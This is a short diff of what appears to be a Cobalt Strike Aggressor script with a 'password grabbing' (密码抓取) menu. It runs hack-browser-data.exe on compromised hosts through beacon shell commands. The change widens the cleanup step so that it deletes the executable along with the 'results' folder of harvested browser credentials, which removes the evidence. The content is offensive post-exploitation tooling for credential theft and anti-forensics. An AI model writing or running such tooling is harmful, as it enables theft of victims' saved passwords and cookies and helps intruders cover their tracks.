@@ -262,10 +262,10 @@ menu "密码抓取" {
         bshell($bid, "hack-browser-data.exe");
       }
 
-      item "删除hack-browser-data"{
+      item "删除 exe 及 resuls 文件夹"{
         local('$bid');
         foreach $bid ($1){
-          bshell($1, "del /f /s /q hack-browser-data.exe");
+          bshell($1, "del /f /s /q hack-browser-data.exe && rmdir /s /q results");
         }
       }
     }      
